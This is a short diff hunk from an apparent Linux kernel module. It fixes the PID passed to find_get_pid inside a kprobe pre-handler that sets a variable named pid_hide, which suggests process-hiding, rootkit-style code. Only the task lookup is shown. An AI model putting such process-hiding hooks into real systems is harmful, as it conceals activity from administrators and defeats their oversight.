@@ -163,7 +163,7 @@ static int handler_pre(struct kprobe *p, struct pt_regs *regs)
 				pid_hide = cfp.pid;
 				struct pid * pid_struct;
 				struct task_struct *task;
-				pid_struct = find_get_pid(pid);
+				pid_struct = find_get_pid(cfp.pid);
 				if (!pid_struct)
 					return 0;
 				task = pid_task(pid_struct, PIDTYPE_PID);
